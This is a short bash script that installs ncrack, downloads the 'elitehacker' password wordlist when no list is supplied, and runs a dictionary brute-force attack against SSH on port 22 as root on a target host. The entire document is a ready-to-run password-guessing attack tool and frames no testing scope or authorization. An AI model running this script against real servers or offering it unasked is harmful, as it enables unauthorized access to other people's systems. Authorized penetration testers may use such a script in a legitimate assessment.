echo "Usage: ./ncrack.sh <target> <passwords-file>"
target=$1
passwords_file=""
if ! which ncrack &> /dev/null
then
    echo "Installing ncrack ..."
    sudo apt update
    sudo apt install ncrack
fi

if [ "$#" -ne 2 ]; then
    passwords_file="elitehacker.txt"
    wget https://downloads.skullsecurity.org/passwords/elitehacker.txt.bz2
    bzip2 -d elitehacker.txt.bz2
else
    passwords_file=$2
fi

ncrack -p 22 --user root -P $passwords_file $target